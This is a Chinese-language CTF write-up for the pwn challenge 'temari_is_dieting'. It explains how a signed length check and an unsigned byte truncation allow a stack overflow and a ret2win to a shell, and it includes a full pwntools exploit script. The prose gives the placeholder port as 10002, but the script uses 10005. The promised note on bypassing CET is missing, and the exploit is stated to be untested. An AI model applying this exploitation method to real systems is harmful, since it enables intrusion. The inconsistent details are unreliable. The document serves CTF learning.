# Writeup：temari_is_dieting（有號/無號長度檢查不一致 → Stack Overflow → ret2win）

> 目標檔案：[temari_is_dieting](temari_is_dieting)
> 遠端：未在題目資料夾內附上連線資訊（不像 `pwn101`/`cheer_for_kotone` 有寫在 README）；本篇 exploit script 暫以同系列的 `ctf.adl.tw` 慣例往下推一個 port（`10002`）佔位，**使用前請自行確認實際 host/port**。
> 分類：Binary Exploitation / pwn
> 前提假設：只有 `temari_is_dieting` 這一個二進位檔案，從零分析（這次連 symbol 都更完整，附帶 debug info）。
> 用到的程式碼：[disasm.py](disasm.py)（反組譯/找字串，輸出見 [disasm_output.txt](disasm_output.txt)）、[temari_is_dieting_solve.py](temari_is_dieting_solve.py)（最終 exploit）

這題延續 `pwn101` / `cheer_for_kotone` 的 ret2win 系列，但這次漏洞的成因更隱密：程式**確實有做長度檢查**，表面上看起來無懈可擊，問題出在檢查用的是「有號數比較」，而拿去決定 `read()` 長度的卻是「只取最低位元組的無號轉換」，兩者對同一個變數的解讀不一致，就是繞過的縫隙。

---

## 1. 初步偵查

```bash
file temari_is_dieting
```
```
temari_is_dieting: ELF 64-bit LSB executable, x86-64, ... dynamically linked,
... with debug_info, not stripped
```

```bash
checksec --file=temari_is_dieting
```
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
Debuginfo:  Yes
```

重點情報：
- **沒有 canary**、**沒有 PIE**：跟前兩題一樣，overflow 不會被偵測，位址也是固定常數。
- **NX enabled**：這次 stack 不可執行，代表不能塞 shellcode 到 stack 上執行；但無所謂，這題一樣有現成的 win function 可以 ret 過去，不需要自己寫 shellcode。
- **SHSTK / IBT enabled**：這是 Intel CET（shadow stack / indirect branch tracking）的編譯期標記。理論上硬體 shadow stack 會另外記錄一份 return address，`ret` 時會跟 shadow stack 比對，篡改堆疊上的 return address 可能被擋下來。但這只是**二進位宣告它支援 CET**，實際會不會生效要看執行環境的 CPU 與作業系統是否真的啟用了 CET 強制模式（很多雲端 CTF 環境或較舊的核心並不會真的開啟）。本篇先按照傳統 ret2win 方式分析/組 exploit，若遠端真的擋下來，才需要考慮別的繞過方式（本文最後會補充）。
- **with debug_info, not stripped**：這次連 debug info 都在，函式名稱、變數名稱都看得到，分析起來比前兩題更輕鬆。

## 2. 列出 symbol table

```python
from pwn import ELF
e = ELF('temari_is_dieting', checksec=False)
for name, addr in sorted(e.symbols.items(), key=lambda x: x[1]):
    if name:
        print(hex(addr), name)
```

跟前兩題同樣的模式：

```
0x401114 execve / plt.execve        ← 又是手動 import 的危險函式
0x4012bb caught
0x4012dc luna_say_maybe             ← 風格像是正常流程不會呼叫到的函式
0x40130f to_ulong                   ← 看名字像是型別轉換用的 helper
0x401326 main
```

`execve` 的 import 加上 `luna_say_maybe` 這種名字，直接鎖定它是 win function 候選；`caught` 看起來像是失敗分支；`to_ulong` 則是個訊號——它多半跟某個整數轉換、長度計算有關，之後要特別注意它怎麼處理符號（sign）。

## 3. 反組譯 `caught` / `luna_say_maybe` / `to_ulong`

```asm
--- caught @ 0x4012bb ---
0x4012c3: lea rax, [rip + 0xd3e]   ; "Producer caught Temari ordering unhealthy food!!!"
0x4012cd: call puts
0x4012d2: mov edi, 0
0x4012d7: call exit                 ; 失敗分支，直接 exit(0)

--- luna_say_maybe @ 0x4012dc ---
0x4012e4: lea rax, [rip + 0xd55]   ; "Ordering successfully!!! But Temari's weight is getting heavier..."
0x4012ee: call puts
0x4012f3: mov edx, 0
0x4012f8: mov esi, 0
0x4012fd: lea rax, [rip + 0xd7f]   ; "/bin/sh"
0x401304: mov rdi, rax
0x401307: call execve               ; execve("/bin/sh", NULL, NULL)
0x40130e: ret

--- to_ulong @ 0x40130f ---
0x401317: mov dword ptr [rbp-0x14], edi   ; 存下參數 n（32-bit int）
0x40131a: mov eax, dword ptr [rbp-0x14]
0x40131d: mov byte ptr [rbp-1], al        ; 只取 n 的最低一個 byte
0x401320: movzx eax, byte ptr [rbp-1]     ; 無號零擴展回傳
0x401325: ret
```

確認：
- `luna_say_maybe()`（固定位址 `0x4012dc`）就是 win function：`puts(...)` + `execve("/bin/sh", NULL, NULL)`。
- `to_ulong(n)` 做的事情等同 C 的 `(unsigned char)n`：不管傳進去的 32-bit 整數是正是負，一律只保留最低的 8 bit，當成 0~255 的無號數回傳。**這就是整題漏洞的核心元件。**

## 4. 反組譯 `main()`

把組語翻譯成 C 虛擬碼（完整組語見 [disasm_output.txt](disasm_output.txt)）：

```c
char buf1[0x20];           // rbp-0x20
int  n;                    // rbp-0x54
char buf2[0x50];           // rbp-0x50

puts("Temari is dieting...");
puts("But Temari tries to scam her producer ...");
puts("Producer: Tsukimura san, what did you order for dinner?");
printf("ari: ");

if (read(0, buf1, 0x1f) <= 0) exit(1);     // 第一個 read，長度固定 31，buf1 是 32 bytes，沒有 overflow 空間
buf1[0x1f] = 0;
buf1[strcspn(buf1, "\n")] = 0;              // 去掉結尾換行

if (strcmp(buf1, "salad") != 0) {           // 關卡一：密語
    caught();                               // 密語錯 -> puts(...) + exit(0)
}

puts("Nice! Tsukimura san is a real idol! (Producer walked away)");
puts("Temari is ordering tonkatsu now...");
printf("How much tonkatsu should Temari order?: ");

if (scanf("%d", &n) != 1) {                 // 必須是合法整數
    puts("Something wrong while ordering...");
    exit(1);
}
if (n > 0x10) {                             // 關卡二：長度上限檢查 —— 有號數比較！
    puts("Producer caught Temari ordering extra food!!!");
    exit(1);
}

getchar();                                  // 吃掉 scanf 殘留的換行字元
printf("Write down the correct tonkatsu name to help Temari finish her order: ");

unsigned char len = to_ulong(n);            // 只取 n 的最低 byte，無號 0~255
read(0, buf2, len);                         // 關鍵：len 可被操縱成遠大於 buf2(0x50) 的值

puts("Ehh? No tonkatsu?");
return 0;
```

故事包裝：Temari 在減肥，密語是 `salad`（沙拉），接著問她想點幾份豬排（tonkatsu），數量規定不能超過 16 份，最後要你把「正確的豬排名字」寫下來——這個最後一步的 `read()` 就是真正出事的地方。

## 5. 漏洞分析：有號檢查 vs 無號轉換的落差

表面上程式已經做了防護：

```c
if (n > 0x10) exit(1);   // 看起來已經把 n 限制在 <= 16
```

但這行比較用的是 **`jle`（有號、signed）**。有號數的世界裡，任何負數都 `<= 16`，所以輸入負數（例如 `-1`）一樣會通過這個檢查，完全不會被擋下來。

問題接著發生在 `to_ulong(n)`：它把這個通過檢查的 `n`（可能是負數）**只取最低的一個 byte**，當成無號數（0~255）回傳，當作 `read()` 的長度參數。

也就是說：

| 階段 | 怎麼看待 `n` | 例子（`n = -1` = `0xFFFFFFFF`） |
|---|---|---|
| 檢查 `n > 0x10` | 有號（32-bit signed） | `-1 <= 16` → **通過** |
| `to_ulong(n)` 算 `read()` 長度 | 無號（只取最低 byte） | `0xFF` = **255** |

檢查看到的是「一個很小（甚至是負）的數字」，但實際拿去用的卻是「這個數字的最低 byte，當成 0~255 的長度」。攻擊者只要故意輸入負數，就能在通過長度上限檢查的同時，讓實際 `read()` 的長度遠超過 `buf2` 的大小（`0x50` = 80 bytes），造成經典的 stack buffer overflow——而且因為沒有 canary，可以直接蓋到 return address。

這跟 `cheer_for_kotone` 的手法（`scanf("%s")` 遇空白才停 vs `strlen`/`strcmp` 遇 `\x00`才停）是同一類問題：**兩段程式碼對同一份資料的「結尾/範圍」認定不一致**，攻擊者就能讓「驗證邏輯看到的版本」跟「實際被使用的版本」產生落差。

## 6. 組 Payload

Offset 計算（從 `lea rax, [rbp-0x50]` 讀出 `buf2` 位址）：

```
buf2 大小 = 0x50 (80) bytes，位於 rbp-0x50
saved rbp = 8 bytes（64-bit 固定）
offset = 0x50 + 0x8 = 0x58（88）bytes，從 buf2 起點到 return address
```

Payload 設計：

```python
n = -1                      # to_ulong(-1) = 0xFF = 255，遠大於 88，足夠蓋到 return address
payload = b'A' * 0x58       # 填滿 buf2 + saved rbp
payload += p64(0x4012dc)    # 蓋 return address -> luna_say_maybe()
```

執行流程驗證：

1. 密語輸入 `salad`，`strcmp` 通過，略過 `caught()`。
2. `scanf("%d", &n)` 輸入 `-1`，`n > 0x10` 用的是 signed 比較，`-1` 一樣視為「小於等於 16」，通過關卡二。
3. `to_ulong(-1)` 回傳 `0xFF`（255），成為 `read(0, buf2, 255)` 的長度參數——真正允許寫入的長度遠超過 `buf2` 本身的 80 bytes。
4. 送出 88 bytes 的 `'A'` 墊滿 `buf2` + saved rbp，緊接著 8 bytes 的 `luna_say_maybe` 位址，蓋掉 return address。
5. `main()` 執行到 `leave; ret`，`ret` 跳去 `0x4012dc`，執行 `puts(...)` + `execve("/bin/sh", NULL, NULL)`，拿到 shell。

## 7. 完整 Exploit Script

```python
from pwn import *

context.arch = 'amd64'

HOST, PORT = 'ctf.adl.tw', 10005   # 連線資訊為推測值，請自行確認

WIN_FUNC = 0x4012dc          # luna_say_maybe() -> execve("/bin/sh", NULL, NULL)
SECRET   = b'salad'

BUF2_SIZE = 0x50
SAVED_RBP = 0x8
OFFSET = BUF2_SIZE + SAVED_RBP   # 0x58

p = remote(HOST, PORT, timeout=10)

p.recvuntil(b'ari: ')
p.sendline(SECRET)

p.recvuntil(b'order?: ')
p.sendline(b'-1')

p.recvuntil(b'order: ')
payload = b'A' * OFFSET
payload += p64(WIN_FUNC)
p.send(payload)

p.interactive()
```

連線成功拿到 shell 後，同樣手動：

```
find / -iname "*flag*" 2>/dev/null
cat <flag 路徑>
```

> ⚠️ 本題資料夾只提供了二進位檔案，沒有附上像 `pwn101`/`cheer_for_kotone` README 那樣明確的 `host:port`。腳本裡的 `ctf.adl.tw:10002` 是依照同系列「pwn101→10000、cheer_for_kotone→10001」的規律往下推一號，**尚未實際驗證連線是否正確**；且本機 Windows 環境沒有 WSL/QEMU，無法直接執行這個 Linux ELF 做本地動態測試，以上流程皆為**純靜態反組譯分析**所得的結論。實際提交前請先確認正確的連線位址，或改用本地 `process('./temari_is_dieting')`（需要在有 Linux 環境的機器上跑）驗證一次。

---

## 重點整理

- **漏洞本體**：`read(0, buf2, to_ulong(n))`，`buf2` 只有 80 bytes，長度完全由使用者輸入的 `n` 間接決定。
- **檢查形同虛設的原因**：`if (n > 0x10) exit(1)` 用的是**有號比較**，負數可以直接繞過；但 `to_ulong()` 把同一個 `n` 當成**無號數只取最低 byte**，兩種解讀方式對「負數」的結果完全不同——檢查端看到「合法範圍」，使用端看到的卻是 0~255 的任意長度。
- **手法分類**：這是一種 **signed/unsigned 混淆（integer truncation / sign confusion）** 造成的長度檢查繞過，本質上跟 `cheer_for_kotone` 的 null-byte 字串結尾不一致是同一個大類——**兩段邏輯對同一份資料的「有效範圍」認知不同**，攻擊者就能製造出一個「通過檢查，但實際行為超出預期」的輸入。
- **最終手法仍是 ret2win**：固定位址、無 PIE，現成的 `luna_say_maybe()`（`execve("/bin/sh")`）可以直接 `ret` 過去，不需要 leak 位址、不需要自己寫 shellcode（NX 也排除了這個選項）。
- **解題思路順序**：`file`/`checksec` 初步偵查（留意 NX/SHSTK/IBT 這類這題特有的新資訊）→ 列 symbol table 找 `execve` import + 可疑函式名 → 反組譯確認 win function 與輔助函式（`to_ulong`，光看名字就要留意型別轉換陷阱）→ 完整反組譯 `main()`，把每個分支、每個比較指令的「有號/無號」都看清楚 → 發現「檢查用有號比較、使用端只取最低 byte」的落差 → 用負數同時騙過上限檢查並換來足夠長的 `read()` 長度 → 算 offset、組 payload、覆蓋 return address → （連線資訊需自行確認）驗證拿 shell、找 flag。
